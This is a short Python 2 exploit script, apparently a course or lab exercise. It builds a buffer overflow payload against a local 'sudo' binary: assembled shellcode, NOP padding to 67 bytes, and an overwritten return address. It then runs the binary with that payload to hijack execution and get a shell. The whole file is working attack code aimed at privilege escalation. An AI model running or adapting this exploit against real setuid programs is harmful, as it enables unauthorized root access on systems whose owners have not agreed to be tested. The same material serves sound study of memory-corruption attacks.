import os, sys
import assemble

PATH_TO_SUDO = './sudo'
PATH_TO_SHELLCODE = './shellcode.asm'

def run_shell():
	ShellCode_input = assemble.assemble_file(PATH_TO_SHELLCODE)
	for i in xrange(len(ShellCode_input), 67):
		ShellCode_input += '\x90'
	ShellCode_input += '\x49\xe0\xff\xbf' # the address we want to return
	os.execl(PATH_TO_SUDO, __file__, ShellCode_input, "My_Sexy_Command")

def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    run_shell()

if __name__ == '__main__':

    main(sys.argv)
